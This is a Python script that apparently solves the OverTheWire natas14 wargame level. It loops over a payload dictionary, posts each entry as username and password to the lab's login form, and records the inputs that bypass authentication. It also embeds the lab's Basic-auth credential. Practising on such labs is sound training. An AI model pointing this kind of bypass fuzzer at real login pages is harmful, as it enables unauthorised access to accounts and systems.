#/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import sys
from time import *

payload_array = []

def post(url,header,header_data):
	global payload_array
	try:
		req = requests.post(url,headers = header,data = header_data)
		if req.status_code == 200:
			webpage = BeautifulSoup(req.text,"html.parser")
			data = webpage.find("div",{"id":"content"})
			if data.text.find("Successful") > -1 :
				payload= header_data['username']
				return(payload_array.append(payload))
			else:
				return
	except Exception as e:
		print(e)	
def test(url):
	global payload_array
	print("")
	print("[*] URL :: %s" % url)
	payloadlist = open("dictionary.txt","r")
	for line in payloadlist.readlines():
		user = line.strip("\n")
		passw = line.strip("\n")
		header_data = {"username":user,"password":passw}
		header = {"Authorization": "Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGxRNUw2cWRsMQ=="} #This is authentication tokken
		print("[*] Trying (%s:%s)" % (user,passw))
		post(url,header,header_data)
	
	sleep(3)
	if (len(payload_array) == 0):
		print("[!]Please Use another list,none of the payload able to bypass this authentication.")
	else:
		print("")
		print("[+]Payloads that able to bypass this authenticate form are ::")
		for pay in payload_array:
			print("\t\t%s" % pay)
		print("")			
def main():
	print("")
	print("Python script try to bypass the authentication form of the natas14(overthewire) challenge.")
	print("\t\t\tWritten by krn_bhargav")
	print("")
	print("Speed up feature is under development of this script.")
	print("")
	sleep(4)
	url = "http://natas14.natas.labs.overthewire.org/index.php"
	test(url)

if __name__ == "__main__":
	main()